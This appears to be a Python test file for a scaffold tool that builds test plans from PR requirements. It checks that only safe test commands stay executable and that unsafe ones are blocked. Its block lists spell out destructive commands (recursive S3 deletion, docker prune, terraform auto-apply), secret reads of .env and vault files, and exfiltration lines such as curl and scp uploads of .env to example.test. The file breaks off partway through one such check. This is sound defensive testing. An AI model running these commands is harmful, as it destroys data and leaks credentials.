    mixed_safe_unsafe_dir = _write_and_run_scaffold(script_dir, tmp_path, MIXED_SAFE_UNSAFE_COMMANDS_CODE_PR_REQUIREMENT, "mixed-safe-unsafe-commands-code-pr-scaffold")
    mixed_safe_unsafe_summary = load_json(mixed_safe_unsafe_dir / "scaffold-summary.json")
    mixed_safe_unsafe_matrix = load_json(mixed_safe_unsafe_dir / "test-matrix.json")
    mixed_safe_unsafe_plan = load_json(mixed_safe_unsafe_dir / "test-plan.json")
    mixed_safe_unsafe_steps = [
        step
        for scenario in mixed_safe_unsafe_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    mixed_safe_unsafe_commands = [step.get("command") for step in mixed_safe_unsafe_steps if step.get("action") == "command"]
    assert_true(mixed_safe_unsafe_summary.get("validation_command_count") == 2, "mixed safe/unsafe PR commands should preserve only non-mutating validation commands.")
    assert_true(["ruff", "format", "--check", "."] in mixed_safe_unsafe_commands, "safe formatter check should remain executable.")
    assert_true(["python", "-m", "pytest", "tests/worker/test_job.py"] in mixed_safe_unsafe_commands, "safe pytest command should remain executable.")
    assert_true(["python", "-m", "ruff", "--fix", "."] not in mixed_safe_unsafe_commands, "mutating ruff --fix command must not become executable.")
    assert_true(["ruff", "format", "."] not in mixed_safe_unsafe_commands, "default-writing ruff format command must not become executable.")
    mixed_safe_unsafe_coverage_path = mixed_safe_unsafe_dir / "requirement-coverage.json"
    coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(mixed_safe_unsafe_dir / "requirement.md"),
            "--matrix",
            str(mixed_safe_unsafe_dir / "test-matrix.json"),
            "--out",
            str(mixed_safe_unsafe_coverage_path),
        ],
        cwd=mixed_safe_unsafe_dir,
        text=True,
        capture_output=True,
    )
    assert_true(coverage_proc.returncode == 0, "unsafe PR command source lines should be mapped as blocked code_pr coverage instead of disappearing.")
    mixed_safe_unsafe_coverage = load_json(mixed_safe_unsafe_coverage_path)
    assert_true(mixed_safe_unsafe_coverage.get("coverage_complete") is True, "mixed safe/unsafe PR command coverage should be complete.")
    coverage_by_text = {
        item.get("text"): item
        for item in mixed_safe_unsafe_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    ruff_fix_matches = coverage_by_text.get("Run `python -m ruff --fix .`.") or {}
    ruff_format_matches = coverage_by_text.get("Run `ruff format .`.") or {}
    assert_true(
        any(match.get("requirement_status") == "Blocked" for match in ruff_fix_matches.get("matches", [])),
        "mutating ruff --fix source line should map to a blocked requirement.",
    )
    assert_true(
        not any("ruff format --check" in str(req.get("text") or "") for req in mixed_safe_unsafe_matrix.get("requirements", []) if req.get("id") in {match.get("requirement_id") for match in ruff_format_matches.get("matches", [])}),
        "mutating `ruff format .` must not be considered covered by the safe `ruff format --check .` command.",
    )


def _verify_build_runner_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证 Make 与包管理器构建命令边界。"""
    unsafe_make_dir = _write_and_run_scaffold(script_dir, tmp_path, UNSAFE_MAKE_TARGETS_CODE_PR_REQUIREMENT, "unsafe-make-targets-code-pr-scaffold")
    unsafe_make_summary = load_json(unsafe_make_dir / "scaffold-summary.json")
    unsafe_make_plan = load_json(unsafe_make_dir / "test-plan.json")
    unsafe_make_steps = [
        step
        for scenario in unsafe_make_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_make_commands = [step.get("command") for step in unsafe_make_steps if step.get("action") == "command"]
    assert_true(unsafe_make_summary.get("validation_command_count") == 1, "mixed safe/unsafe make targets should preserve only non-mutating make validation commands.")
    assert_true(unsafe_make_summary.get("blocked_validation_command_count") == 2, "mutating make targets should be modeled as blocked validation commands.")
    assert_true(["make", "test"] in unsafe_make_commands, "safe make test target should remain executable.")
    assert_true(["make", "migrate"] not in unsafe_make_commands, "make migrate must not become an executable validation command.")
    assert_true(["make", "seed"] not in unsafe_make_commands, "make seed must not become an executable validation command.")
    assert_true(
        unsafe_make_summary.get("blocked_validation_commands") == ["make migrate", "make seed"],
        "blocked mutating make commands should be listed for auditability.",
    )
    unsafe_make_coverage_path = unsafe_make_dir / "requirement-coverage.json"
    unsafe_make_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_make_dir / "requirement.md"),
            "--matrix",
            str(unsafe_make_dir / "test-matrix.json"),
            "--out",
            str(unsafe_make_coverage_path),
        ],
        cwd=unsafe_make_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_make_coverage_proc.returncode == 0, "unsafe make target source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_make_coverage = load_json(unsafe_make_coverage_path)
    unsafe_make_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_make_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in ("make migrate", "make seed"):
        command_matches = unsafe_make_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_make_coverage.get("coverage_complete") is True, "unsafe make command source coverage should remain complete.")

    unsafe_package_dir = _write_and_run_scaffold(script_dir, tmp_path, UNSAFE_PACKAGE_SCRIPTS_CODE_PR_REQUIREMENT, "unsafe-package-scripts-code-pr-scaffold")
    unsafe_package_summary = load_json(unsafe_package_dir / "scaffold-summary.json")
    unsafe_package_plan = load_json(unsafe_package_dir / "test-plan.json")
    unsafe_package_steps = [
        step
        for scenario in unsafe_package_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_package_commands = [step.get("command") for step in unsafe_package_steps if step.get("action") == "command"]
    assert_true(unsafe_package_summary.get("validation_command_count") == 1, "mixed safe/unsafe package scripts should preserve only non-mutating validation commands.")
    assert_true(unsafe_package_summary.get("blocked_validation_command_count") == 3, "mutating package scripts should be modeled as blocked validation commands.")
    assert_true(["npm", "test", "--", "billing"] in unsafe_package_commands, "safe npm test command should remain executable.")
    assert_true(["npm", "run", "migrate"] not in unsafe_package_commands, "npm run migrate must not become an executable validation command.")
    assert_true(["pnpm", "run", "seed"] not in unsafe_package_commands, "pnpm run seed must not become an executable validation command.")
    assert_true(["yarn", "deploy"] not in unsafe_package_commands, "yarn deploy must not become an executable validation command.")
    assert_true(
        unsafe_package_summary.get("blocked_validation_commands") == ["npm run migrate", "pnpm run seed", "yarn deploy"],
        "blocked mutating package scripts should be listed for auditability.",
    )
    unsafe_package_coverage_path = unsafe_package_dir / "requirement-coverage.json"
    unsafe_package_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_package_dir / "requirement.md"),
            "--matrix",
            str(unsafe_package_dir / "test-matrix.json"),
            "--out",
            str(unsafe_package_coverage_path),
        ],
        cwd=unsafe_package_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_package_coverage_proc.returncode == 0, "unsafe package script source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_package_coverage = load_json(unsafe_package_coverage_path)
    unsafe_package_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_package_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in ("npm run migrate", "pnpm run seed", "yarn deploy"):
        command_matches = unsafe_package_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_package_coverage.get("coverage_complete") is True, "unsafe package script source coverage should remain complete.")

    unsafe_package_options_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_PACKAGE_SCRIPTS_WITH_OPTIONS_CODE_PR_REQUIREMENT,
        "unsafe-package-scripts-with-options-code-pr-scaffold",
    )
    unsafe_package_options_summary = load_json(unsafe_package_options_dir / "scaffold-summary.json")
    unsafe_package_options_plan = load_json(unsafe_package_options_dir / "test-plan.json")
    unsafe_package_options_steps = [
        step
        for scenario in unsafe_package_options_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_package_options_commands = [step.get("command") for step in unsafe_package_options_steps if step.get("action") == "command"]
    unsafe_package_options_blocked_commands = [
        "npm --prefix services/api run migrate",
        "npm --workspace api run seed",
        "pnpm --dir services/api run seed",
        "yarn --cwd services/api deploy",
        "yarn workspace api deploy",
        "corepack pnpm --dir services/api run seed",
    ]
    assert_true(unsafe_package_options_summary.get("validation_command_count") == 1, "package runner options should preserve only non-mutating validation commands.")
    assert_true(unsafe_package_options_summary.get("blocked_validation_command_count") == 6, "mutating package scripts with runner options should be blocked validation commands.")
    assert_true(
        ["npm", "--prefix", "services/api", "test", "--", "billing"] in unsafe_package_options_commands,
        "safe npm --prefix test command should remain executable.",
    )
    for command in unsafe_package_options_blocked_commands:
        assert_true(
            command.split() not in unsafe_package_options_commands,
            f"{command} must not become an executable validation command.",
        )
    assert_true(
        unsafe_package_options_summary.get("blocked_validation_commands") == unsafe_package_options_blocked_commands,
        "blocked mutating package scripts with runner options should be listed for auditability.",
    )
    unsafe_package_options_coverage_path = unsafe_package_options_dir / "requirement-coverage.json"
    unsafe_package_options_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_package_options_dir / "requirement.md"),
            "--matrix",
            str(unsafe_package_options_dir / "test-matrix.json"),
            "--out",
            str(unsafe_package_options_coverage_path),
        ],
        cwd=unsafe_package_options_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_package_options_coverage_proc.returncode == 0, "unsafe package script source lines with runner options should map as blocked code_pr coverage instead of disappearing.")
    unsafe_package_options_coverage = load_json(unsafe_package_options_coverage_path)
    unsafe_package_options_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_package_options_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_package_options_blocked_commands:
        command_matches = unsafe_package_options_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_package_options_coverage.get("coverage_complete") is True, "unsafe package script source coverage with runner options should remain complete.")

def _verify_database_runner_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证数据库工具与框架命令边界。"""
    unsafe_database_tool_runner_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_DATABASE_TOOL_RUNNER_CODE_PR_REQUIREMENT,
        "unsafe-database-tool-runner-code-pr-scaffold",
    )
    unsafe_database_tool_runner_summary = load_json(unsafe_database_tool_runner_dir / "scaffold-summary.json")
    unsafe_database_tool_runner_plan = load_json(unsafe_database_tool_runner_dir / "test-plan.json")
    unsafe_database_tool_runner_steps = [
        step
        for scenario in unsafe_database_tool_runner_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_database_tool_runner_commands = [step.get("command") for step in unsafe_database_tool_runner_steps if step.get("action") == "command"]
    unsafe_database_tool_runner_blocked_commands = [
        "npx prisma migrate deploy",
        "pnpm exec prisma migrate deploy",
        "npm exec prisma db seed",
        "python manage.py migrate",
        "uv run alembic upgrade head",
        "poetry run flask db upgrade",
    ]
    assert_true(unsafe_database_tool_runner_summary.get("validation_command_count") == 1, "database mutation tool runners should preserve only non-mutating validation commands.")
    assert_true(unsafe_database_tool_runner_summary.get("blocked_validation_command_count") == 6, "database mutation tool runners should be blocked validation commands.")
    assert_true(
        ["python", "-m", "pytest", "tests/migrations/test_schema.py"] in unsafe_database_tool_runner_commands,
        "safe pytest migration test command should remain executable.",
    )
    for command in unsafe_database_tool_runner_blocked_commands:
        assert_true(
            command.split() not in unsafe_database_tool_runner_commands,
            f"{command} must not become an executable validation command.",
        )
    assert_true(
        unsafe_database_tool_runner_summary.get("blocked_validation_commands") == unsafe_database_tool_runner_blocked_commands,
        "blocked database mutation tool runners should be listed for auditability.",
    )
    unsafe_database_tool_runner_coverage_path = unsafe_database_tool_runner_dir / "requirement-coverage.json"
    unsafe_database_tool_runner_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_database_tool_runner_dir / "requirement.md"),
            "--matrix",
            str(unsafe_database_tool_runner_dir / "test-matrix.json"),
            "--out",
            str(unsafe_database_tool_runner_coverage_path),
        ],
        cwd=unsafe_database_tool_runner_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_database_tool_runner_coverage_proc.returncode == 0, "database mutation source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_database_tool_runner_coverage = load_json(unsafe_database_tool_runner_coverage_path)
    unsafe_database_tool_runner_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_database_tool_runner_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_database_tool_runner_blocked_commands:
        command_matches = unsafe_database_tool_runner_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_database_tool_runner_coverage.get("coverage_complete") is True, "database mutation source coverage should remain complete.")

    unsafe_framework_database_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_FRAMEWORK_DATABASE_CODE_PR_REQUIREMENT,
        "unsafe-framework-database-code-pr-scaffold",
    )
    unsafe_framework_database_summary = load_json(unsafe_framework_database_dir / "scaffold-summary.json")
    unsafe_framework_database_plan = load_json(unsafe_framework_database_dir / "test-plan.json")
    unsafe_framework_database_steps = [
        step
        for scenario in unsafe_framework_database_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_framework_database_commands = [step.get("command") for step in unsafe_framework_database_steps if step.get("action") == "command"]
    unsafe_framework_database_blocked_commands = [
        "bundle exec rails db:migrate",
        "bin/rails db:seed",
        "php artisan migrate --force",
        "npx sequelize db:migrate",
        "pnpm exec typeorm migration:run",
    ]
    assert_true(unsafe_framework_database_summary.get("validation_command_count") == 1, "framework database mutations should preserve only non-mutating validation commands.")
    assert_true(unsafe_framework_database_summary.get("blocked_validation_command_count") == 5, "framework database mutations should be blocked validation commands.")
    assert_true(
        ["npm", "test", "--", "billing"] in unsafe_framework_database_commands,
        "safe npm test command should remain executable beside blocked framework database commands.",
    )
    for command in unsafe_framework_database_blocked_commands:
        assert_true(
            command.split() not in unsafe_framework_database_commands,
            f"{command} must not become an executable validation command.",
        )
    assert_true(
        unsafe_framework_database_summary.get("blocked_validation_commands") == unsafe_framework_database_blocked_commands,
        "blocked framework database mutation commands should be listed for auditability.",
    )
    unsafe_framework_database_coverage_path = unsafe_framework_database_dir / "requirement-coverage.json"
    unsafe_framework_database_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_framework_database_dir / "requirement.md"),
            "--matrix",
            str(unsafe_framework_database_dir / "test-matrix.json"),
            "--out",
            str(unsafe_framework_database_coverage_path),
        ],
        cwd=unsafe_framework_database_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_framework_database_coverage_proc.returncode == 0, "framework database mutation source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_framework_database_coverage = load_json(unsafe_framework_database_coverage_path)
    unsafe_framework_database_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_framework_database_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_framework_database_blocked_commands:
        command_matches = unsafe_framework_database_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_framework_database_coverage.get("coverage_complete") is True, "framework database mutation source coverage should remain complete.")

def _verify_release_command_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证基础设施与发布命令边界。"""
    unsafe_infra_destructive_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_INFRA_DESTRUCTIVE_CODE_PR_REQUIREMENT,
        "unsafe-infra-destructive-code-pr-scaffold",
    )
    unsafe_infra_destructive_summary = load_json(unsafe_infra_destructive_dir / "scaffold-summary.json")
    unsafe_infra_destructive_plan = load_json(unsafe_infra_destructive_dir / "test-plan.json")
    unsafe_infra_destructive_steps = [
        step
        for scenario in unsafe_infra_destructive_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_infra_destructive_commands = [step.get("command") for step in unsafe_infra_destructive_steps if step.get("action") == "command"]
    unsafe_infra_destructive_blocked_commands = [
        "kubectl apply -f infra/prod/deployment.yaml",
        "terraform apply -auto-approve",
        "aws s3 rm s3://prod-bucket --recursive",
        "rm -rf tmp/cache",
    ]
    assert_true(unsafe_infra_destructive_summary.get("validation_command_count") == 1, "destructive infrastructure commands should preserve only non-mutating validation commands.")
    assert_true(unsafe_infra_destructive_summary.get("blocked_validation_command_count") == 4, "destructive infrastructure commands should be blocked validation commands.")
    assert_true(
        ["npm", "test", "--", "infra"] in unsafe_infra_destructive_commands,
        "safe npm test command should remain executable beside blocked infrastructure commands.",
    )
    for command in unsafe_infra_destructive_blocked_commands:
        assert_true(
            command.split() not in unsafe_infra_destructive_commands,
            f"{command} must not become an executable validation command.",
        )
    assert_true(
        ["//prod-bucket", "--recursive"] not in unsafe_infra_destructive_commands,
        "s3:// URLs must not be split into malformed executable //bucket commands.",
    )
    assert_true(
        unsafe_infra_destructive_summary.get("blocked_validation_commands") == unsafe_infra_destructive_blocked_commands,
        "blocked destructive infrastructure commands should be listed for auditability.",
    )
    unsafe_infra_destructive_coverage_path = unsafe_infra_destructive_dir / "requirement-coverage.json"
    unsafe_infra_destructive_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_infra_destructive_dir / "requirement.md"),
            "--matrix",
            str(unsafe_infra_destructive_dir / "test-matrix.json"),
            "--out",
            str(unsafe_infra_destructive_coverage_path),
        ],
        cwd=unsafe_infra_destructive_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_infra_destructive_coverage_proc.returncode == 0, "destructive infrastructure source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_infra_destructive_coverage = load_json(unsafe_infra_destructive_coverage_path)
    unsafe_infra_destructive_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_infra_destructive_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_infra_destructive_blocked_commands:
        command_matches = unsafe_infra_destructive_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_infra_destructive_coverage.get("coverage_complete") is True, "destructive infrastructure source coverage should remain complete.")

    unsafe_release_destructive_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_RELEASE_DESTRUCTIVE_CODE_PR_REQUIREMENT,
        "unsafe-release-destructive-code-pr-scaffold",
    )
    unsafe_release_destructive_summary = load_json(unsafe_release_destructive_dir / "scaffold-summary.json")
    unsafe_release_destructive_plan = load_json(unsafe_release_destructive_dir / "test-plan.json")
    unsafe_release_destructive_steps = [
        step
        for scenario in unsafe_release_destructive_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_release_destructive_commands = [step.get("command") for step in unsafe_release_destructive_steps if step.get("action") == "command"]
    unsafe_release_destructive_blocked_commands = [
        "git push --force-with-lease origin main",
        "gh pr merge 123 --admin --delete-branch",
        "docker compose down -v",
        "docker system prune -af",
        "vercel deploy --prod",
        "supabase db push",
    ]
    assert_true(unsafe_release_destructive_summary.get("validation_command_count") == 1, "destructive release commands should preserve only non-mutating validation commands.")
    assert_true(unsafe_release_destructive_summary.get("blocked_validation_command_count") == 6, "destructive release commands should be blocked validation commands.")
    assert_true(
        ["npm", "test", "--", "release"] in unsafe_release_destructive_commands,
        "safe npm test command should remain executable beside blocked release commands.",
    )
    for command in unsafe_release_destructive_blocked_commands:
        assert_true(
            command.split() not in unsafe_release_destructive_commands,
            f"{command} must not become an executable validation command.",
        )
    assert_true(
        unsafe_release_destructive_summary.get("blocked_validation_commands") == unsafe_release_destructive_blocked_commands,
        "blocked destructive release commands should be listed for auditability.",
    )
    unsafe_release_destructive_coverage_path = unsafe_release_destructive_dir / "requirement-coverage.json"
    unsafe_release_destructive_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_release_destructive_dir / "requirement.md"),
            "--matrix",
            str(unsafe_release_destructive_dir / "test-matrix.json"),
            "--out",
            str(unsafe_release_destructive_coverage_path),
        ],
        cwd=unsafe_release_destructive_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_release_destructive_coverage_proc.returncode == 0, "destructive release source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_release_destructive_coverage = load_json(unsafe_release_destructive_coverage_path)
    unsafe_release_destructive_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_release_destructive_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_release_destructive_blocked_commands:
        command_matches = unsafe_release_destructive_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_release_destructive_coverage.get("coverage_complete") is True, "destructive release source coverage should remain complete.")

_BUILD_RELEASE_SCENARIO_FAMILIES: tuple[Callable[[Path, Path], None], ...] = (
    _verify_build_runner_safety,
    _verify_database_runner_safety,
    _verify_release_command_safety,
)

def _verify_build_and_release_safety(script_dir: Path, tmp_path: Path) -> None:
    """按构建发布安全边界运行子场景，并保留原有场景族入口。"""
    for family in _BUILD_RELEASE_SCENARIO_FAMILIES:
        try:
            family(script_dir, tmp_path)
        except AssertionError as exc:
            raise AssertionError(f"{family.__name__}: {exc}") from exc


def _verify_secret_boundary(script_dir: Path, tmp_path: Path) -> None:
    unsafe_secret_exposure_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SECRET_EXPOSURE_CODE_PR_REQUIREMENT,
        "unsafe-secret-exposure-code-pr-scaffold",
    )
    unsafe_secret_exposure_summary = load_json(unsafe_secret_exposure_dir / "scaffold-summary.json")
    unsafe_secret_exposure_plan = load_json(unsafe_secret_exposure_dir / "test-plan.json")
    unsafe_secret_exposure_steps = [
        step
        for scenario in unsafe_secret_exposure_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_secret_exposure_commands = [step.get("command") for step in unsafe_secret_exposure_steps if step.get("action") == "command"]
    unsafe_secret_exposure_blocked_commands = [
        "cat .env",
        "cat config/secrets.yml",
        "printenv DATABASE_URL",
        "aws secretsmanager get-secret-value --secret-id prod/db",
        "aws ssm get-parameter --name /prod/db/password --with-decryption",
        "kubectl get secret api-token -o yaml",
        "gh secret set API_TOKEN --body \"$TOKEN\"",
        "vault kv get secret/prod/db",
        "op read op://prod/db/password",
    ]
    assert_true(unsafe_secret_exposure_summary.get("validation_command_count") == 1, "secret exposure validation should preserve only non-secret test commands.")
    assert_true(unsafe_secret_exposure_summary.get("blocked_validation_command_count") == 9, "secret exposure commands should be blocked validation commands.")
    assert_true(
        ["npm", "test", "--", "config"] in unsafe_secret_exposure_commands,
        "safe npm test command should remain executable beside blocked secret exposure commands.",
    )
    for command in unsafe_secret_exposure_blocked_commands:
        assert_true(
            command.split() not in unsafe_secret_exposure_commands,
            f"{command} must not become an executable validation command.",
        )
    assert_true(
        unsafe_secret_exposure_summary.get("blocked_validation_commands") == unsafe_secret_exposure_blocked_commands,
        "blocked secret exposure commands should be listed for auditability.",
    )
    unsafe_secret_exposure_coverage_path = unsafe_secret_exposure_dir / "requirement-coverage.json"
    unsafe_secret_exposure_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_secret_exposure_dir / "requirement.md"),
            "--matrix",
            str(unsafe_secret_exposure_dir / "test-matrix.json"),
            "--out",
            str(unsafe_secret_exposure_coverage_path),
        ],
        cwd=unsafe_secret_exposure_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_secret_exposure_coverage_proc.returncode == 0, "secret exposure source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_secret_exposure_coverage = load_json(unsafe_secret_exposure_coverage_path)
    unsafe_secret_exposure_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_secret_exposure_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_secret_exposure_blocked_commands:
        command_matches = unsafe_secret_exposure_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_secret_exposure_coverage.get("coverage_complete") is True, "secret exposure source coverage should remain complete.")

    unsafe_env_file_shell_secret_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_ENV_FILE_SHELL_SECRET_CODE_PR_REQUIREMENT,
        "unsafe-env-file-shell-secret-code-pr-scaffold",
    )
    unsafe_env_file_shell_secret_summary = load_json(unsafe_env_file_shell_secret_dir / "scaffold-summary.json")
    unsafe_env_file_shell_secret_plan = load_json(unsafe_env_file_shell_secret_dir / "test-plan.json")
    unsafe_env_file_shell_secret_steps = [
        step
        for scenario in unsafe_env_file_shell_secret_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_env_file_shell_secret_commands = [step.get("command") for step in unsafe_env_file_shell_secret_steps if step.get("action") == "command"]
    unsafe_env_file_shell_secret_blocked_commands = [
        "source .env && npm test -- config",
        ". .env && npm test -- config",
        "bash -lc \"cat .env\"",
        "sh -c \"printenv DATABASE_URL\"",
        "grep DATABASE_URL .env",
        "sed -n '1,20p' .env",
    ]
    assert_true(unsafe_env_file_shell_secret_summary.get("validation_command_count") == 1, "env-file shell validation should preserve only non-secret test commands.")
    assert_true(unsafe_env_file_shell_secret_summary.get("blocked_validation_command_count") == 6, "env-file and shell-wrapped secret commands should be blocked validation commands.")
    assert_true(
        ["npm", "test", "--", "config"] in unsafe_env_file_shell_secret_commands,
        "safe npm test command should remain executable beside blocked env-file shell commands.",
    )
    for command in unsafe_env_file_shell_secret_blocked_commands:
        assert_true(
            command.split() not in unsafe_env_file_shell_secret_commands,
            f"{command} must not become an executable validation command.",
        )
    assert_true(
        ["bash", "-lc", "cat .env"] not in unsafe_env_file_shell_secret_commands,
        "bash -lc secret reads must not become executable validation commands.",
    )
    assert_true(
        ["sh", "-c", "printenv DATABASE_URL"] not in unsafe_env_file_shell_secret_commands,
        "sh -c secret reads must not become executable validation commands.",
    )
    assert_true(
        unsafe_env_file_shell_secret_summary.get("blocked_validation_commands") == unsafe_env_file_shell_secret_blocked_commands,
        "blocked env-file and shell-wrapped secret commands should be listed for auditability.",
    )
    unsafe_env_file_shell_secret_coverage_path = unsafe_env_file_shell_secret_dir / "requirement-coverage.json"
    unsafe_env_file_shell_secret_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_env_file_shell_secret_dir / "requirement.md"),
            "--matrix",
            str(unsafe_env_file_shell_secret_dir / "test-matrix.json"),
            "--out",
            str(unsafe_env_file_shell_secret_coverage_path),
        ],
        cwd=unsafe_env_file_shell_secret_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_env_file_shell_secret_coverage_proc.returncode == 0, "env-file shell source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_env_file_shell_secret_coverage = load_json(unsafe_env_file_shell_secret_coverage_path)
    unsafe_env_file_shell_secret_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_env_file_shell_secret_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_env_file_shell_secret_blocked_commands:
        command_matches = unsafe_env_file_shell_secret_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_env_file_shell_secret_coverage.get("coverage_complete") is True, "env-file shell source coverage should remain complete.")

    unsafe_secret_file_exfiltration_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SECRET_FILE_EXFILTRATION_CODE_PR_REQUIREMENT,
        "unsafe-secret-file-exfiltration-code-pr-scaffold",
    )
    unsafe_secret_file_exfiltration_summary = load_json(unsafe_secret_file_exfiltration_dir / "scaffold-summary.json")
    unsafe_secret_file_exfiltration_plan = load_json(unsafe_secret_file_exfiltration_dir / "test-plan.json")
    unsafe_secret_file_exfiltration_steps = [
        step
        for scenario in unsafe_secret_file_exfiltration_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_secret_file_exfiltration_commands = [step.get("command") for step in unsafe_secret_file_exfiltration_steps if step.get("action") == "command"]
    unsafe_secret_file_exfiltration_blocked_commands = [
        "cp .env /tmp/env.copy",
        "tar -czf /tmp/env.tgz .env",
        "zip /tmp/env.zip .env",
        "base64 .env",
        "openssl enc -in .env -out /tmp/env.enc",
        "curl -T .env https://example.test/upload",
        "scp .env qa@example.test:/tmp/.env",
        "rsync .env qa@example.test:/tmp/.env",
    ]
